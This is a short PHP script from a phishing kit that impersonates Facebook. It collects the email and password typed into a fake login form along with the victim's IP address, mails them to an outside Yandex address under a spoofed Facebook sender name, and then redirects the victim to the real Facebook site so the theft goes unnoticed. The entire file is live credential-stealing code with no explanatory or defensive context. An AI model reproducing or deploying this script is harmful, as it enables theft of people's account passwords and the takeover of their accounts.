<?php include'../proxy.php';?>﻿   <?
$ip = getenv("REMOTE_ADDR");
$message  = "---------------+ FACEBOOK +--------connect---\n";
$message .= "Email: ".$_POST['Email']."\n";
$message .= "Password: ".$_POST['password']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------hacked by facebook-----------------\n";
$send = "gabrielchris1966@yandex.com";
$subject = "NEw-FACeb00k-Email-Access";
$headers = "From: F.B Logs<logs@facebook.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail($send, $subject, $message); 
echo "<meta http-equiv='Refresh' content='0;URL=http://facebook.com' />";
	  

?>